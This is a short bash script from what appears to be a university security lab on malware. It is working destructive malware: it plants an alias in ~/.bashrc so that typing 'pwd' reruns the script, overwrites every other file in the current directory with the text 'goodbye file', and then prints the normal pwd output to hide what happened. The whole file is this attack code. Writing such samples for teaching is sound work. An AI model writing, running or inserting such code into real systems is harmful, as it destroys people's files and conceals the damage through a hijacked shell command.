#! /usr/bin/env bash

# Lab 7: Malware
# Goal: overwrite files

# View ~/.bashrc to see current aliases. If we haven't already created an alias 
# to execute our malware script, then add this alias to further propagate.
# aliasToMatch = alias to set if nonexistent
# currentLastAlias = last alias/line currently in ~/.bashrc
aliasToMatch="alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'"
currentLastAlias=$(cat ~/.bashrc | tail -n 1)
if [ "$currentLastAlias" != "$aliasToMatch" ]; then
	echo "alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'" >> ~/.bashrc
	source ~/.bashrc
fi

# Load files into an array
filearray=($(ls | grep -Ev "script[[:digit:]]*.sh"))

# Loop through file array and overwrite files
for key in ${!filearray[@]}
do
	echo "goodbye file" > ${filearray[$key]}
done

# Trojan horse - whatever output is here should match bashrc alias expected output
pwd
